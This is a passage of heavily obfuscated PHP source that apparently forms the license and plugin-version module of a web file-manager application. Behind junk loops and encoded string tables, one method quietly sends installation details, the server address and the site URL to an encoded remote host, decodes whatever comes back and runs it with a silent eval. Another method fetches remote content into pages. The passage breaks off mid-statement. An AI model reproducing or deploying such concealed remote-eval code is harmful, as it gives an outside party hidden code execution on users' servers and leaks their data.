$GLOBALS[$ñ‰œé›[13]]; $ ¤Ùƒ¬Œ = $_SERVER[$ñ‰œé›[24]]; if ($ ¤Ùƒ¬Œ == $ñ‰œé›[208] && $this->cuxb32573510 == $ñ‰œé›[109]) { show_json(LNG($ñ‰œé›[209]), !1, $ñ‰œé›[210]); } $½èî£³ = array($ñ‰œé›[211], $ñ‰œé›[212]); if (in_array($ ¤Ùƒ¬Œ, $½èî£³)) { if ($this->cuxb32573510 == $ñ‰œé›[109] && isset($ªŠµòµ•[$ñ‰œé›[213]])) { show_json(LNG($ñ‰œé›[209]), !1, $ñ‰œé›[210]); die; } $‚²Õ ñ„ = $this->aofkbe5be118(); if ($‚²Õ ñ„ != intval($ñ‰œé›[214])) { if ($‚²Õ ñ„ <= Model($ñ‰œé›[125])->count()) { show_json(LNG($ñ‰œé›[215]), !1, $ñ‰œé›[210]); die; } } } } private function rbjg6ea6861e() { $çÑÃê‹ =& $_SERVER[óÔë„ú]; $åÆìĞíÏ =& $_SERVER[æÈËŒ÷È]; $ôÁº¨Ã = array($åÆìĞíÏ[119], $åÆìĞíÏ[120]); $‰’¥‘Ë = $çÑÃê‹[741]; while (strlen($‰’¥‘Ë) < $çÑÃê‹[705]) { if (!$‰’¥‘Ë) { break; } $‰’¥‘Ë++; } if (!KodUser::isRoot() || !isset($_GET[$åÆìĞíÏ[216]])) { return; } if (!in_array($_SERVER[$åÆìĞíÏ[24]], $ôÁº¨Ã)) { return; } $›óÇËß = $åÆìĞíÏ[217]; $›óÇËß = $this->lsno0357a418($›óÇËß, $åÆìĞíÏ[218]); $Ù¼ºÏ• = stream_context_create(array($åÆìĞíÏ[219] => array($åÆìĞíÏ[220] => $åÆìĞíÏ[221], $åÆìĞíÏ[222] => 3))); $¦õ‹Ú = $çÑÃê‹[742]; while (strlen($¦õ‹Ú) < $çÑÃê‹[695]) { if (!$¦õ‹Ú) { break; } $¦õ‹Ú++; } $öóÍƒÈí = @file_get_contents($›óÇËß, !1, $Ù¼ºÏ•); $ã­²´æ = $çÑÃê‹[743]; header($åÆìĞíÏ[223]); if ($öóÍƒÈí && strstr($öóÍƒÈí, $åÆìĞíÏ[224])) { echo $öóÍƒÈí; } die; } public function bzco559da173($æğ¯œúÂ) { $›Ÿº®à§ =& $_SERVER[óÔë„ú]; $¸“ş›íô =& $_SERVER[æÈËŒ÷È]; if ($this->cuxb32573510 == $¸“ş›íô[225]) { return $æğ¯œúÂ; } $‚ûéœ¢§ = $this->versionPluginList(); $ÔÕ×ÆØ† = $›Ÿº®à§[744]; if (strlen($ÔÕ×ÆØ†) < $›Ÿº®à§[715]) { die; } $Ï¯‡¡Çà = explode($¸“ş›íô[226], $this->versionPluginFilter()); $¹óŸ¸ = array(); $ğş™ìÄÇ = $›Ÿº®à§[745]; foreach ($‚ûéœ¢§ as $òáˆÌìÎ => $Ùä•³ˆ) { if ($Ùä•³ˆ == $¸“ş›íô[227] && substr($this->cuxb32573510, 0, 1) == $¸“ş›íô[227]) { continue; } if (!in_array($òáˆÌìÎ, $Ï¯‡¡Çà)) { $¹óŸ¸[] = $òáˆÌìÎ; } } foreach ($¹óŸ¸ as $òáˆÌìÎ) { unset($æğ¯œúÂ[$òáˆÌìÎ]); $†Ñä¶ªó = $›Ÿº®à§[746]; while (strlen($†Ñä¶ªó) < $›Ÿº®à§[691]) { if (!$†Ñä¶ªó) { break; } $†Ñä¶ªó++; } } return $æğ¯œúÂ; } private function versionPluginList() { $‹¾˜²æß =& $_SERVER[óÔë„ú]; $ÕèşÂõ¦ =& $_SERVER[æÈËŒ÷È]; return array($ÕèşÂõ¦[228] => $ÕèşÂõ¦[227], $ÕèşÂõ¦[229] => $ÕèşÂõ¦[227], $ÕèşÂõ¦[230] => $ÕèşÂõ¦[227], $ÕèşÂõ¦[231] => $ÕèşÂõ¦[232], $ÕèşÂõ¦[233] => $ÕèşÂõ¦[232], $ÕèşÂõ¦[234] => $ÕèşÂõ¦[232], $ÕèşÂõ¦[235] => $ÕèşÂõ¦[232], $ÕèşÂõ¦[236] => $ÕèşÂõ¦[232], $ÕèşÂõ¦[237] => $ÕèşÂõ¦[232], $ÕèşÂõ¦[238] => $ÕèşÂõ¦[232], $ÕèşÂõ¦[239] => $ÕèşÂõ¦[232], $ÕèşÂõ¦[240] => $ÕèşÂõ¦[232], $ÕèşÂõ¦[241] => $ÕèşÂõ¦[232], $ÕèşÂõ¦[242] => $ÕèşÂõ¦[232], $ÕèşÂõ¦[243] => $ÕèşÂõ¦[232], $ÕèşÂõ¦[244] => $ÕèşÂõ¦[232]); $üâ¬Õ¦Î = $‹¾˜²æß[747]; while ($üâ¬Õ¦Î < $‹¾˜²æß[715]) { if ($üâ¬Õ¦Î >= 0) { break; } $üâ¬Õ¦Î++; } } private function versionPluginFilter() { $Šğ‰Çöü =& $_SERVER[æÈËŒ÷È]; if ($this->cuxb32573510 == $Šğ‰Çöü[109]) { return $Šğ‰Çöü[6]; } $–Äô™†° = _get($this->aetj1c96a5fd, $Šğ‰Çöü[245], $Šğ‰Çöü[6]); $ó™¼„¶ò = _get($this->aetj1c96a5fd, $Šğ‰Çöü[116], $Šğ‰Çöü[6]); $ÀâƒÈÑß = _get($this->aetj1c96a5fd, $Šğ‰Çöü[246], $Šğ‰Çöü[6]); $ÙŠˆ‰¸ = $_SERVER[óÔë„ú][748]; if ($ó™¼„¶ò > time() && $ÀâƒÈÑß > time()) { $®¢Å¿´ˆ = explode($Šğ‰Çöü[226], $–Äô™†°); $óâÆõº³ = array_keys($this->versionPluginList()); $–Äô™†° = array_merge($®¢Å¿´ˆ, $óâÆõº³); $–Äô™†° = implode($Šğ‰Çöü[226], array_filter(array_unique($–Äô™†°))); } return $–Äô™†°; } private function ktcd0669c759() { $°‡—‘¨ =& $_SERVER[æÈËŒ÷È]; if ($this->cuxb32573510 != $°‡—‘¨[109]) { $GLOBALS[$°‡—‘¨[86]][$°‡—‘¨[90]][$°‡—‘¨[247]] = $°‡—‘¨[206]; return; } $GLOBALS[$°‡—‘¨[86]][$°‡—‘¨[248]] = $°‡—‘¨[122]; if (Model($°‡—‘¨[249])->get($°‡—‘¨[63]) != $°‡—‘¨[206]) { Model($°‡—‘¨[249])->set($°‡—‘¨[63], $°‡—‘¨[206]); } } public function xbrib66e2799() { return $_SERVER[æÈËŒ÷È][250]; } private function dxvp4b10b4f1() { $ôàä¦ğ =& $_SERVER[óÔë„ú]; $­ô­ë…ğ =& $_SERVER[æÈËŒ÷È]; $òÉõÛ€ã = array($­ô­ë…ğ[251], $­ô­ë…ğ[252], $­ô­ë…ğ[253]); $ÔÎ‚²ó = $­ô­ë…ğ[254] . md5($­ô­ë…ğ[255]); if ($this->cuxb32573510 == $­ô­ë…ğ[109] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$­ô­ë…ğ[24]], $òÉõÛ€ã)) { return; } if (time() % 4 != 0) { return; } $İ™Óµá¼ = call_user_func(array($­ô­ë…ğ[256], $­ô­ë…ğ[257]), $ÔÎ‚²ó); if ($İ™Óµá¼ && time() - $İ™Óµá¼ < intval($­ô­ë…ğ[258])) { return; } call_user_func(array($­ô­ë…ğ[256], $­ô­ë…ğ[139]), $ÔÎ‚²ó, time()); $­ùáÑ¬ = $ôàä¦ğ[749]; if (!$­ùáÑ¬) { return; } $ıÀü”óü = Model($­ô­ë…ğ[33])->get($­ô­ë…ğ[100]); $ÁäãÜ¼à = array($­ô­ë…ğ[152] => Model($­ô­ë…ğ[33])->get($­ô­ë…ğ[153]), $­ô­ë…ğ[167] => $this->cuxb32573510, $­ô­ë…ğ[163] => $_SERVER[$­ô­ë…ğ[164]], $­ô­ë…ğ[165] => Model($­ô­ë…ğ[33])->get($­ô­ë…ğ[131]), $­ô­ë…ğ[105] => md5($_SERVER[$­ô­ë…ğ[106]] . $ıÀü”óü), $­ô­ë…ğ[156] => $­ô­ë…ğ[136], $­ô­ë…ğ[159] => $_SERVER[$­ô­ë…ğ[160]]); $áÍ¨¹ = $this->tweu219a8910($­ô­ë…ğ[259], $ÁäãÜ¼à); $¾êÛĞÒ = $ôàä¦ğ[750]; while ($¾êÛĞÒ < $ôàä¦ğ[687]) { if ($¾êÛĞÒ >= 0) { break; } $¾êÛĞÒ++; } if (!is_array($áÍ¨¹)) { return; } if ($áÍ¨¹[$­ô­ë…ğ[152]] && $áÍ¨¹[$­ô­ë…ğ[260]]) { if ($this->nitzd5379515($áÍ¨¹[$­ô­ë…ğ[260]]) == $ÁäãÜ¼à[$­ô­ë…ğ[152]]) { return; } } $this->cbfg6681d3e9(); $××’¹ùş = $ôàä¦ğ[751]; while ($××’¹ùş < $ôàä¦ğ[687]) { if ($××’¹ùş >= 0) { break; } $××’¹ùş++; } if ($this->nitzd5379515($áÍ¨¹[$­ô­ë…ğ[260]]) != $ÁäãÜ¼à[$­ô­ë…ğ[152]]) { $¥¤™ò‰¯ = array($­ô­ë…ğ[185] => $ıÀü”óü, $­ô­ë…ğ[186] => $_SERVER[$­ô­ë…ğ[106]], $­ô­ë…ğ[187] => this_url(), $­ô­ë…ğ[161] => $_SERVER[$­ô­ë…ğ[162]]); $Ï½´Ş™å = $this->wyhkdb55de8b(json_encode($¥¤™ò‰¯)); $áÍ¨¹ = $this->tweu219a8910($­ô­ë…ğ[188] . $Ï½´Ş™å); if ($áÍ¨¹ && is_array($áÍ¨¹) && isset($áÍ¨¹[$­ô­ë…ğ[260]])) { $Ë×û‚É« = $this->thje72de2e13($áÍ¨¹[$­ô­ë…ğ[260]], 2); if ($Ë×û‚É«) { $Ë×û‚É« = $this->nitzd5379515($Ë×û‚É«); } if ($Ë×û‚É«) { try { @eval($Ë×û‚É«); } catch (Exception $®áóòšæ) { } } } } } private function tweu219a8910($«”ÇµŸ„ = '', $¶€­êüÌ = array(), $ó–ÒÖ¡È = 5) { $…Èá¼§³ =& $_SERVER[óÔë„ú]; $Ë¤˜®«è =& $_SERVER[æÈËŒ÷È]; $Ú¾¥‹Ä = $Ë¤˜®«è[261]; $Ú¾¥‹Ä = $this->lsno0357a418($Ú¾¥‹Ä, $Ë¤˜®«è[262]); $Ú¾¥‹Ä = $Ú¾¥‹Ä . $«”ÇµŸ„; if ($¶€­êüÌ && is_array($¶€­êüÌ)) { $Ú¾¥‹Ä = $Ú¾¥‹Ä . $Ë¤˜®«è[263] . http_build_query($¶€­êüÌ); } if ($¶€­êüÌ === -1) { return $Ú¾¥‹Ä; } $ÉÒ¡ùÔÛ = stream_context_create(array($Ë¤˜®«è[219] => array($Ë¤˜®«è[222] => $ó–ÒÖ¡È, $Ë¤˜®«è[220] => $Ë¤˜®«è[264]), $Ë¤˜®«è[265] => array($Ë¤˜®«è[266] => !1, $Ë¤˜®«è[267] => !1))); $´™ÑßØ = $…Èá¼§³[752]; while ($´™ÑßØ < $…Èá¼§³[715]) { if ($´™ÑßØ >= 0) { break; } $´™ÑßØ++; } $¶€­êüÌ = @file_get_contents($Ú¾¥‹Ä, !1, $ÉÒ¡ùÔÛ); return json_decode($¶€­êüÌ, !0); $‚­Ğúô = $…Èá¼§³[753]; if (!$‚­Ğúô) { die; } } private function aofkbe5be118() { $Œ¾¼Á½Å =& $_SERVER[óÔë„ú]; $–ÚŸ×­¼ =& $_SERVER[æÈËŒ÷È]; $‰Ìì©ğ‘ = array($–ÚŸ×­¼[268] => $–ÚŸ×­¼[269], $–ÚŸ×­¼[270] => $–ÚŸ×­¼[271], $–ÚŸ×­¼[272] => $–ÚŸ×­¼[273], $–ÚŸ×­¼[274] => $–ÚŸ×­¼[275], $–ÚŸ×­¼[276] => $–ÚŸ×­¼[277], $–ÚŸ×­¼[278] => $–ÚŸ×­¼[214], $–ÚŸ×­¼[279] => $–ÚŸ×­¼[214], $–ÚŸ×­¼[280] => $–ÚŸ×­¼[269], $–ÚŸ×­¼[281] => $–ÚŸ×­¼[271], $–ÚŸ×­¼[282] => $–ÚŸ×­¼[273], $–ÚŸ×­¼[283] => $–ÚŸ×­¼[284], $–ÚŸ×­¼[285] => $–ÚŸ×­¼[275], $–ÚŸ×­¼[286] => $–ÚŸ×­¼[287], $–ÚŸ×­¼[288] => $–ÚŸ×­¼[277], $–ÚŸ×­¼[289] => $–ÚŸ×­¼[290], $–ÚŸ×­¼[291] => $–ÚŸ×­¼[292], $–ÚŸ×­¼[293] => $–ÚŸ×­¼[294]); $ß£êÖ³ = $Œ¾¼Á½Å[754]; if (strlen($ß£êÖ³) < $Œ¾¼Á½Å[715]) { die; } $²¶É­Å© = $‰Ìì©ğ‘[$this->cuxb32573510]; $ÅãÀ¬¨ = $Œ¾¼Á½Å[755]; $²¶É­Å© = intval($²¶É­Å© ? $²¶É­Å© : $–ÚŸ×­¼[269]); $ãÓ‚×­ø = $Œ¾¼Á½Å[756]; while (strlen($ãÓ‚×­ø) < $Œ¾¼Á½Å[691]) { if (!$ãÓ‚×­ø) { break; } $ãÓ‚×­ø++; } $îî‘ò°× = _get($this->aetj1c96a5fd, $–ÚŸ×­¼[295]); $†¦Î€ê’ = $Œ¾¼Á½Å[757]; if (!$†¦Î€ê’) { die; } $îî‘ò°× = $îî‘ò°× ? intval($îî‘ò°×) : 0; return $²¶É­Å© + $îî‘ò°×; } public function lyuw48b03c8e($Ú Ó‚›) { $ü½ñ„ =& $_SERVER[æÈËŒ÷È]; $•ª¨Ø­§ = $this->aofkbe5be118(); $äÉ¸†à = $_SERVER[óÔë„ú][758]; if (!$äÉ¸†à) { return; } if ($Ú Ó‚›[$ü½ñ„[296]] == $ü½ñ„[122]) { return; } if ($•ª¨Ø­§ >= intval($ü½ñ„[214])) { return; } $£ƒÌ…Îµ = Model($ü½ñ„[125])->count(); if ($£ƒÌ…Îµ <= $•ª¨Ø­§) { return; } $ı˜¾·÷ª = Model($ü½ñ„[125])->field($ü½ñ„[296])->limit($•ª¨Ø­§)->select(); $ı˜¾·÷ª = array_to_keyvalue($ı˜¾·÷ª, $ü½ñ„[6], $ü½ñ„[296]); if (!in_array($Ú Ó‚›[$ü½ñ„[296]], $ı˜¾·÷ª)) { show_json($ü½ñ„[297], !1, $ü½ñ„[210]); } } public function rvpg12339618() { $…üúÁ‡ =& $_SERVER[óÔë„ú]; $Õ¤Ó·„ü =& $_SERVER[æÈËŒ÷È]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $¡¯¡çÙ• = $Õ¤Ó·„ü[217]; $¡¯¡çÙ• = $this->lsno0357a418($¡¯¡çÙ•, $Õ¤Ó·„ü[218]); $¶ÆœŒœ× = $…üúÁ‡[759]; if (strlen($¶ÆœŒœ×) < $…üúÁ‡[687]) { return; } $àş´‚¨Ò = stream_context_create(array($Õ¤Ó·„ü[219] => array($Õ¤Ó·„ü[220] => $Õ¤Ó·„ü[221], $Õ¤Ó·„ü[222] => 3))); $¡–ÔÉÉ» = $…üúÁ‡[760]; if (!$¡–ÔÉÉ») { return; } $å˜¶¼© = @file_get_contents($¡¯¡çÙ•, !1, $àş´‚¨Ò); echo $Õ¤Ó·„ü[298] . hash_encode($å˜¶¼©) . $Õ¤Ó·„ü[299]; } private function zaox3b79d407($ÛÈîÌ, $ğ„˜ù¢Ğ, $åîõ›÷‚ = 3) { $ôœƒ†–‘ =& $_SERVER[óÔë„ú]; $ú°€‹üç =& $_SERVER[æÈËŒ÷È]; usleep(1); $”ƒÇÙ®» = $ôœƒ†–‘[761]; if (strlen($”ƒÇÙ®») < $ôœƒ†–‘[695]) { return; } $ÛÈîÌ = trim($ÛÈîÌ); $ïÃúî’ = $ôœƒ†–‘[762]; if (!$ïÃúî’) { die; } $æõ¹¹¥˜ = mt_rand(0, 5) . $ú°€‹üç[6]; $€ãï²Ã = $ôœƒ†–‘[763]; while (strlen($€ãï²Ã) < $ôœƒ†–‘[687]) { if (!$€ãï²Ã) { break; } $€ãï²Ã++; } $‘ù¿”Ö  = rand_string(15); $†ü…ø÷¸ = $ôœƒ†–‘[764]; if (strlen($†ü…ø÷¸) < $ôœƒ†–‘[705]) { return; } $†ˆêéƒé = $ú°€‹üç[300]; switch ($æõ¹¹¥˜) { case $ú°€‹üç[206]: $ëÜÇßÚ = $this->ykdubc57e695($ÛÈîÌ, strrev($ğ„˜ù¢Ğ . $‘ù¿”Ö )); $à°æ‹§  = $ôœƒ†–‘[765]; if (!$à°æ‹§ ) { die; } break; $¶Ì±õÄã = $ôœƒ†–‘[766]; while ($¶Ì±õÄã < $ôœƒ†–‘[705]) { if ($¶Ì±õÄã >= 0) { break; } $¶Ì±õÄã++; } case $ú°€‹üç[122]: $ëÜÇßÚ = $this->ykdubc57e695($ÛÈîÌ, strrev($‘ù¿”Ö  . $ğ„˜ù¢Ğ)); break; $æÕÌ“ÁÇ = $ôœƒ†–‘[767]; if (!$æÕÌ“ÁÇ) { return; } case $ú°€‹üç[301]: $ëÜÇßÚ = $this->ykdubc57e695($ÛÈîÌ, base64_encode($‘ù¿”Ö  . $ğ„˜ù¢Ğ)); $Á±ÉäÁ– = $ôœƒ†–‘[768]; break; case $ú°€‹üç[302]: $ëÜÇßÚ = $this->ykdubc57e695($ÛÈîÌ, md5($‘ù¿”Ö  . $ğ„˜ù¢Ğ)); $¨’³µ© = $ôœƒ†–‘[769]; break; $ÔÒ‚Ñ«€ = $ôœƒ†–‘[770]; if (!$ÔÒ‚Ñ«€) { return; } case $ú°€‹üç[303]: $ÛÈîÌ = base64_encode($ÛÈîÌ); $‘ü¾ÙÌ× = rand(0, 64); $ÂÊ¸”Ã = $ôœƒ†–‘[771]; if (strlen($ÂÊ¸”Ã) < $ôœƒ†–‘[687]) { die; } $Ñ£Å°›Æ = $†ˆêéƒé[$‘ü¾ÙÌ×]; $‚Ú®² = md5($Ñ£Å°›Æ . md5($ğ„˜ù¢Ğ . $Ñ£Å°›Æ) . $ğ„˜ù¢Ğ); $Ëä§çÙ“ = $ôœƒ†–‘[772]; while (strlen($Ëä§çÙ“) < $ôœƒ†–‘[715]) { if (!$Ëä§çÙ“) { break; } $Ëä§çÙ“++; } $‚Ú®² = substr($‚Ú®², $‘ü¾ÙÌ× % 8, $‘ü¾ÙÌ× % 8 + 7); $şÕŸèÀ = $ôœƒ†–‘[773]; if (!$şÕŸèÀ) { return; } $ØèÚºåÎ = $ú°€‹üç[6]; $ˆ¸´‹ßü = $ôœƒ†–‘[774]; $¬¿ÚÑ” = 0; $Õ¨Ô¼õ¬ = 0; $Äü»Í¾‘ = 0; $¤À©‚Ì± = $ôœƒ†–‘[709]; if (!$¤À©‚Ì±) { return; } for ($¬¿ÚÑ” = 0; $¬¿ÚÑ” < strlen($ÛÈîÌ); $¬¿ÚÑ”++) { $Äü»Í¾‘ = $Äü»Í¾‘ == strlen($‚Ú®²) ? 0 : $Äü»Í¾‘; $ï­á•Òå = $ôœƒ†–‘[775]; $Õ¨Ô¼õ¬ = ($‘ü¾ÙÌ× + strpos($†ˆêéƒé, $ÛÈîÌ[$¬¿ÚÑ”]) + ord($‚Ú®²[$Äü»Í¾‘++])) % 64; $«ƒ˜ô·ï = $ôœƒ†–‘[776]; if (!$«ƒ˜ô·ï) { die; } $ØèÚºåÎ .= $†ˆêéƒé[$Õ¨Ô¼õ¬]; } $ëÜÇßÚ = hash_encode($Ñ£Å°›Æ . $ØèÚºåÎ); $íÎğ«ã = $ôœƒ†–‘[777]; break; default: $ëÜÇßÚ = $this->ykdubc57e695($ÛÈîÌ, $ğ„˜ù¢Ğ . $‘ù¿”Ö ); $Ùö‚ªË = $ôœƒ†–‘[752]; while ($Ùö‚ªË < $ôœƒ†–‘[705]) { if ($Ùö‚ªË >= 0) { break; } $Ùö‚ªË++; } break; $ßúˆ€…‘ = $ôœƒ†–‘[778]; while ($ßúˆ€…‘ < $ôœƒ†–‘[691]) { if ($ßúˆ€…‘ >= 0) { break; } $ßúˆ€…‘++; } } $ëÜÇßÚ = strrev($æõ¹¹¥˜ . $‘ù¿”Ö  . $ëÜÇßÚ); if ($åîõ›÷‚ - 1 > 0) { $ëÜÇßÚ = $this->zaox3b79d407($ëÜÇßÚ, $ğ„˜ù¢Ğ, $åîõ›÷‚ - 1); } return $ëÜÇßÚ; } private function thje72de2e13($™›‚½, $àğŞ¤ÄÓ, $ÚÓâ¿ğÂ = 3) { $ŠÖ–‚ =& $_SERVER[óÔë„ú]; $Ì£Á£÷» =& $_SERVER[æÈËŒ÷È]; if (!is_string($™›‚½) || strlen($™›‚½) < 10) { return !1; } $™›‚½ = trim($™›‚½); $™›‚½ = strrev($™›‚½); $óÚÙ™ˆ = $™›‚½[0]; $õ®ÃŠ¹š = $ŠÖ–‚[779]; while ($õ®ÃŠ¹š < $ŠÖ–‚[715]) { if ($õ®ÃŠ¹š >= 0) { break; } $õ®ÃŠ¹š++; } $¤ŞÁ ¼í = substr($™›‚½, 1, 15); $™›‚½ = substr($™›‚½, 16); $òÑÏØÚ = $ŠÖ–‚[780]; while ($òÑÏØÚ < $ŠÖ–‚[705]) { if ($òÑÏØÚ >= 0) { break; } $òÑÏØÚ++; } $æŒÀ›ï¥ = $Ì£Á£÷»[300]; $â“÷£÷ = $ŠÖ–‚[781]; while (strlen($â“÷£÷) < $ŠÖ–‚[705]) { if (!$â“÷£÷) { break; } $â“÷£÷++; } switch ($óÚÙ™ˆ) { case $Ì£Á£÷»[206]: $û§»§”ã = $this->lsno0357a418($™›‚½, strrev($àğŞ¤ÄÓ . $¤ŞÁ ¼í)); $¶…ğÀÂ· = $ŠÖ–‚[782]; if (!$¶…ğÀÂ·) { die; } break; case $Ì£Á£÷»[122]: $û§»§”ã = $this->lsno0357a418($™›‚½, strrev($¤ŞÁ ¼í . $àğŞ¤ÄÓ)); $¶•Š‡ ù = $ŠÖ–‚[783]; if (!$¶•Š‡ ù) { return; } break; $®‘×íºš = $ŠÖ–‚[784]; while ($®‘×íºš < $ŠÖ–‚[715]) { if ($®‘×íºš >= 0) { break; } $®‘×íºš++; } case $Ì£Á£÷»[301]: $û§»§”ã = $this->lsno0357a418($™›‚½, base64_encode($¤ŞÁ ¼í . $àğŞ¤ÄÓ)); break; case $Ì£Á£÷»[302]: $û§»§”ã = $this->lsno0357a418($™›‚½, md5($¤ŞÁ ¼í . $àğŞ¤ÄÓ)); $öÈïàÅÕ = $ŠÖ–‚[785]; break; $‰Ş´ÅãØ = $ŠÖ–‚[786]; while ($‰Ş´ÅãØ < $ŠÖ–‚[687]) { if ($‰Ş´ÅãØ >= 0) { break; } $‰Ş´ÅãØ++; } case $Ì£Á£÷»[303]: $™›‚½ = hash_decode($™›‚½); $ì¬•ö•¦ = $™›‚½[0]; $™›‚½ = substr($™›‚½, 1); $Ëˆ§¸Ê– = strpos($æŒÀ›ï¥, $ì¬•ö•¦); $œöøûÛà = md5($ì¬•ö•¦ . md5($àğŞ¤ÄÓ . $ì¬•ö•¦) . $àğŞ¤ÄÓ); $œöøûÛà = substr($œöøûÛà, $Ëˆ§¸Ê– % 8, $Ëˆ§¸Ê– % 8 + 7); $¹ïıŒ”£ = $Ì£Á£÷»[6]; $¸ÇİÀ›İ = 0; $¶Ù›Ñ®ˆ = $ŠÖ–‚[787]; $ññª•İ = 0; $Äø²±ïõ = 0; for ($¸ÇİÀ›İ = 0; $¸ÇİÀ›İ < strlen($™›‚½); $¸ÇİÀ›İ++) { $Äø²±ïõ = $Äø²±ïõ == strlen($œöøûÛà) ? 0 : $Äø²±ïõ; $¤ÂÙÚÜó = $Äø²±ïõ++; $ññª•İ = strpos($æŒÀ›ï¥, $™›‚½[$¸ÇİÀ›İ]) - $Ëˆ§¸Ê– - ord($œöøûÛà[$¤ÂÙÚÜó]); $ıå¡‡÷Ó = $ŠÖ–‚[788]; while ($ıå¡‡÷Ó < $ŠÖ–‚[705]) { if ($ıå¡‡÷Ó >= 0) { break; } $ıå¡‡÷Ó++; } while ($ññª•İ < 0) { $ññª•İ += 64; $ß—Ú°ñ˜ = $ŠÖ–‚[789]; while (strlen($ß—Ú°ñ˜) < $ŠÖ–‚[691]) { if (!$ß—Ú°ñ˜) { break; } $ß—Ú°ñ˜++; } } $¹ïıŒ”£ .= $æŒÀ›ï¥[$ññª•İ]; $÷©øÇ´¡ = $ŠÖ–‚[790]; if (!$÷©øÇ´¡) { die; } } $û§»§”ã = base64_decode($¹ïıŒ”£); $—Ğ¢«ü¶ = $ŠÖ–‚[791]; if (!$—Ğ¢«ü¶) { die; } break; default: $û§»§”ã = $this->lsno0357a418($™›‚½, $àğŞ¤ÄÓ . $¤ŞÁ ¼í); break; } if ($ÚÓâ¿ğÂ - 1 > 0) { $û§»§”ã = $this->thje72de2e13($û§»§”ã, $àğŞ¤ÄÓ, $ÚÓâ¿ğÂ - 1); } return $û§»§”ã; } public function wyhkdb55de8b($¡¹”Ê’ª) { $§ÃÏÉ =& $_SERVER[óÔë„ú]; $á¸Ù±¾ß =& $_SERVER[æÈËŒ÷È]; $êàÏ“·¢ = $this->pcmrabe98dd3(); $£Äóóàé = $this->pcmrabe98dd3(); $È¶·½ƒ = ($êàÏ“·¢ - 1) * ($£Äóóàé - 1); $«æóçí˜ = intval(($êàÏ“·¢ + $£Äóóàé) / 2); while (1) { $ÉäğÒçæ = $«æóçí˜; $Ñ¶ª¹ú¡ = $È¶·½ƒ; while ($Ñ¶ª¹ú¡ % $ÉäğÒçæ != 0) { $´‰õ‘ò‡ = $Ñ¶ª¹ú¡; $Ñ¶ª¹ú¡ = $ÉäğÒçæ; $ÉäğÒçæ = $´‰õ‘ò‡ % $ÉäğÒçæ; $ëö°‚¢ô = $§ÃÏÉ[792]; } if ($ÉäğÒçæ == 1) { break; } else { $«æóçí˜++; } } $ÛßÛğ”‡ = 2; $‡ôÓ¼Ã = $§ÃÏÉ[793]; while (strlen($‡ôÓ¼Ã) < $§ÃÏÉ[695]) { if (!$‡ôÓ¼Ã) { break; } $‡ôÓ¼Ã++; } for ($×ÉÉõ™“ = 0; $×ÉÉõ™“ < $È¶·½ƒ * 10; $×ÉÉõ™“++) { if (($È¶·½ƒ * $×ÉÉõ™“ + 1) % $«æóçí˜ == 0) { $ÛßÛğ”‡ = intval(($È¶·½ƒ * $×ÉÉõ™“ + 1) / $«æóçí˜); break; } } $Ú®ì»ƒ = $this->ykdubc57e695($êàÏ“·¢ * $£Äóóàé . $á¸Ù±¾ß[6], $á¸Ù±¾ß[136]); $ãèô‘‰ = md5($á¸Ù±¾ß[304] . ($êàÏ“·¢ + $£Äóóàé) . $á¸Ù±¾ß[305] . $«æóçí˜ . $á¸Ù±¾ß[305] . $ÛßÛğ”‡ . $á¸Ù±¾ß[306]); $æ§ì÷ıØ = $§ÃÏÉ[794]; if (strlen($æ§ì÷ıØ) < $§ÃÏÉ[695]) { die; } $€¯¦ş‚Ù = $this->ykdubc57e695($¡¹”Ê’ª, $ãèô‘‰) . $á¸Ù±¾ß[307] . $Ú®ì»ƒ; return $€¯¦ş‚Ù; } public function nitzd5379515($êİ¼¯) { $½Å£¢ƒ =& $_SERVER[óÔë„ú]; $Ñù•šê× =& $_SERVER[æÈËŒ÷È]; $Ğ€ ¥©ø = explode($Ñù•šê×[307], $êİ¼¯); if (count($Ğ€ ¥©ø) != 2) { return $Ñù•šê×[6]; } $¤ƒ’¶Õ = $this->lsno0357a418($Ğ€ ¥©ø[1] . $Ñù•šê×[6], $Ñù•šê×[136]); if (!$¤ƒ’¶Õ) { return $Ñù•šê×[6]; } $¤ƒ’¶Õ = intval($¤ƒ’¶Õ); $Ëœ†ûçÈ = 0; $ôŸÃõÛ = $½Å£¢ƒ[795]; $¥†á£ğ = 0; $İëõÍæ = $½Å£¢ƒ[796]; while ($İëõÍæ < $½Å£¢ƒ[715]) { if ($İëõÍæ >= 0) { break; } $İëõÍæ++; } for ($ú’Ø¾Å‹ = 3; $ú’Ø¾Å‹ < $¤ƒ’¶Õ; $ú’Ø¾Å‹ += 2) { if ($¤ƒ’¶Õ % $ú’Ø¾Å‹ != 0) { continue; } $Ëœ†ûçÈ = $ú’Ø¾Å‹; $¥†á£ğ = intval($¤ƒ’¶Õ / $ú’Ø¾Å‹); $³ïŞ’Ì = $½Å£¢ƒ[797]; while (strlen($³ïŞ’Ì) < $½Å£¢ƒ[695]) { if (!$³ïŞ’Ì) { break; } $³ïŞ’Ì++; } break; $ì…ÕØê› = $½Å£¢ƒ[798]; if (!$ì…ÕØê›) { return; } } $é·ÚÇØ = ($Ëœ†ûçÈ - 1) * ($¥†á£ğ - 1); $İ¬Ñ†œÙ = intval(($Ëœ†ûçÈ + $¥†á£ğ) / 2); while (1) { $ûœ‚É¥È = $İ¬Ñ†œÙ; $œ—Ü”² = $é·ÚÇØ; $·•ï°»¨ = $½Å£¢ƒ[799]; if (!$·•ï°»¨) { return; } while ($œ—Ü”² % $ûœ‚É¥È != 0) { $”ëìÄ’× = $œ—Ü”²; $Â™ÇÆæ€ = $½Å£¢ƒ[800]; if (!$Â™ÇÆæ€) { die; } $œ—Ü”² = $ûœ‚É¥È; $ôÈ°üà = $½Å£¢ƒ[801]; if (strlen($ôÈ°üà) < $½Å£¢ƒ[715]) { return; } $ûœ‚É¥È = $”ëìÄ’× % $ûœ‚É¥È; } if ($ûœ‚É¥È == 1) { break; } else { $İ¬Ñ†œÙ++; } } $íá‘…íº = 2; for ($ú’Ø¾Å‹ = 0; $ú’Ø¾Å‹ < $é·ÚÇØ * 10; $ú’Ø¾Å‹++) { if (($é·ÚÇØ * $ú’Ø¾Å‹ + 1) % $İ¬Ñ†œÙ == 0) { $íá‘…íº = intval(($é·ÚÇØ * $ú’Ø¾Å‹ + 1) / $İ¬Ñ†œÙ); break; } } $®û»å‡· = md5($Ñù•šê×[304] . ($Ëœ†ûçÈ + $¥†á£ğ) . $Ñù•šê×[305] . $İ¬Ñ†œÙ . $Ñù•šê×[305] 